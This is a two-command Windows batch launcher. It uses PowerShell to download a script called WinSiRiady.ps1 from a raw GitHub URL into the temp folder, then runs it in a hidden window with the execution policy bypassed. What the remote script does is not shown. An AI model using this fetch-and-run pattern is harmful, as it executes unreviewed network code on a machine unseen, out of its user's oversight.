@echo off
powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/riadysandi/WinSiRiady/master/WinSiRiady.ps1', '%TEMP%\WinSiRiady_temp.ps1')"
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\WinSiRiady_temp.ps1"
